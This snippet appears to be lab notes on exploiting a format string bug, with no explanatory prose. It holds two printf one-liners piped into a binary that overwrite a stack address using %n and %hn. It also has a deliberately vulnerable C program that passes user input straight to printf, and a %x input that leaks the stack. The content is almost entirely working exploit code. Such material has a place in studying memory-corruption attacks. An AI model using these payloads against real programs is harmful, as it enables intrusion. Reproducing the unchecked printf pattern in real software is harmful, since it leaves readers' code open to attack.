`(printf "\x41\x41\x41\x41\x78\xfd\xff\xbf%%c%%n"; cat) | ./test6`
`(printf "\x41\x41\x41\x41\x78\xfd\xff\xbf\x41\x41\x41\x41\x7a\xfd\xff\xbf%%64172d%%hn%%50415d%%hn"; cat) | ./test6`

```c
// format_bugfile.c

#include <stdio.h>
main() {
	int i = 0;
	char buf[64];
	memset(buf, 0, 4);
	read(0, buf, 64);
	printf(buf);
}
```

```shell
gcc -o format_bugfile format_bugfile.c
./format_bugfile
AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
```